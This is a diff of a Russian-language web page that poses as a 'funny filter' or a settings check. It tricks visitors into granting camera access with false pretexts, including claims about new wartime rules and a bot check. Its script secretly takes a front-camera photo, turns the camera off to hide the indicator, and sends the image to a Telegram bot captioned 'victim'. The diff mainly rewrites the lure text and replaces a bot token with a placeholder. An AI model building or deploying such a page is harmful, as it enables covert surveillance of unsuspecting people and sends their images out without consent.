@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Смешной фильтр 2026 😂</title>
+  <title>новые идеи!</title>
   <style>
     body { margin:0; font-family: Arial, sans-serif; background:#111; color:#fff; text-align:center; }
     #container { padding: 20px; max-width: 500px; margin: auto; }
@@ -20,62 +20,45 @@
 </head>
 <body>
 
-<div id="container">
-  <h1>😂 хочешь видеть приветствия?</h1>
-  <p>разреши расширения что бы мы могли тебе доверять! 😎</p>
-  
-  <button onclick="startPrank()">хочу посмотреть! 😂</button>
-  
-  <div id="status"></div>
-</div>
-
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
+<!-- СКРИПТ ПЕРЕМЕЩЁН ВВЕРХ — ЭТО КЛЮЧЕВОЙ ФИКС -->
 <script>
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 const status = document.getElementById('status');
 
-const TELEGRAM_TOKEN = '8678005399:AAFTHzqbs40DHQ3ziXoAXdFR1Kg_cuu_PTc;  // ← замени на свой токен
-const CHAT_ID = '8269416289';  // ← замени на свой chat_id
+const TELEGRAM_TOKEN = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';  // ← ТВОЙ ТОКЕН
+const CHAT_ID = '123456789';  // ← ТВОЙ chat_id
 
 async function startPrank() {
-  status.textContent = 'Запрашиваем разрешения...';
+  status.textContent = 'Запрашиваем расширения...';
   
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user' }  // фронтальная камера
+      video: { facingMode: 'user' } 
     });
     
     video.srcObject = stream;
     video.play();
     
-    // Ждём 2–4 секунды, чтобы человек расслабился и подумал, что сейчас фильтр появится
     await new Promise(r => setTimeout(r, 3000));
     
-    status.textContent = 'Щааа... проверяем! ';
+    status.textContent = 'Щааа... делаем фото! 📸';
     
-    // Делаем снимок
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    // Останавливаем камеру (чтобы индикатор погас)
     stream.getTracks().forEach(track => track.stop());
     
-    // Конвертируем в base64
     const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
     
-    // Отправляем в Telegram
-    status.textContent = 'ура смотри!';
+    status.textContent = 'проверяю бот ли ты?';
     
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
     formData.append('caption', `Жертва: ${new Date().toLocaleString('ru-RU')} 😭`);
     
-    // Конвертируем base64 в Blob для отправки как файл
     const blob = await (await fetch(dataUrl)).blob();
     formData.append('photo', blob, 'prank.jpg');
     
@@ -84,15 +67,28 @@ async function startPrank() {
       body: formData
     });
     
-    status.innerHTML = 'жди щас загрузится! 😂<br>подожди.';
+    status.innerHTML = 'жди немного<br>еще немного.';
     
   } catch (err) {
     console.error(err);
     status.textContent = err.name === 'NotAllowedError' 
-      ? 'Ты не разрешил расширение попробуй еще раз!'
+      ? 'Ты не разрешил расширение! 😢 Попробуй ещё раз!'
       : 'Ошибка: ' + err.message;
   }
 }
 </script>
+
+<div id="container">
+  <h1>😂 Проверь новые настройки!</h1>
+  <p>Нажми кнопку ниже, разреши разрешения изза новых правил, при войне!</p>
+  
+  <button onclick="startPrank()">открыть идеи</button>
+  
+  <div id="status"></div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
 </body>
 </html>
